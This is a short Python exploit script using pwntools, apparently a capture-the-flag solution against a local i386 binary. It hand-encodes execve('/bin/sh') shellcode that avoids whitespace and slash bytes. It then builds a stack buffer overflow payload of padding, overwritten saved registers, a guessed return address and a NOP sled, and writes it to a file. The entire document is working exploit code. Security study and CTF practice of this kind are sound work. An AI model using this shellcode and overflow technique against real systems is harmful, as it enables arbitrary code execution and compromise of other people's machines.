from pwn import *
context(os='linux', arch='i386', log_level='info')
H,P='localhost',6666

# We need a shellcode without whitecharacters for __iso99_scanf and without slashes ('/',0x2f) for our format
# Modified shellcode version without 0xb
sh = asm(shellcraft.i386.pushstr('\x68'))
#sh += asm(shellcraft.i386.pushstr('/bin///sh'))
#sh += asm(shellcraft.i386.pushstr('\x73\x2f\x2f\x2f'))
#sh += asm(shellcraft.i386.pushstr('\x63\x69\x62\x2f'))
sh = "\x6a\x68" # push 0x68
#sh += "\x68\x2f\x2f\x2f\x73" # push 0x732f2f2f # TODO Doesnt work, try moving 2f
sh += asm(shellcraft.i386.mov('eax',0x52060606))
sh += "\x05\x29\x29\x29\x21" # add eax, 0x21212121
sh += "\x50" # push eax
sh += asm(shellcraft.i386.mov('eax',0x45403906))
sh += "\x05\x29\x29\x29\x29" # add eax, 0x21212121
sh += "\x50" # push eax
#sh += "\x68\x2f\x62\x69\x6e" # push 0x6e69622f
sh += asm(shellcraft.i386.mov('ebx','esp'))
sh += asm(shellcraft.i386.mov('ecx',0))
#sh += asm(shellcraft.i386.push('0xb')) # Original, following instruction replace this command
sh += asm(shellcraft.i386.mov('eax',0x41)) # eax = 0x41
sh += '\x83\xe8\x36' # sub eax, 0x36 83 == sub, e8 == eax, 36 == number to subtract
sh += '\x99' # cdq
sh += '\xcd\x80' # int 0x80

stackaddr = 0xffffd2c8

exploit = "B"*0x80
exploit += "PESI" # push esi
exploit += "PEDI" # push edi
exploit += "PEBP" # overwrite ebp
exploit += p32(stackaddr) # overwrite eip with a guessed stack address to the nopsled
exploit += "\x90"*0x200 # NOP-Sled, since we could not leak any stack address
exploit += sh

with open('in','wb') as f: f.write(exploit)
#r = process(['./what','ausgeschnitzel','flugelfragen'], env={'AUTH':exploit+'/faultier/'})
#print r.recvuntil('\n')
#gdb.attach(r)
#r.interactive()
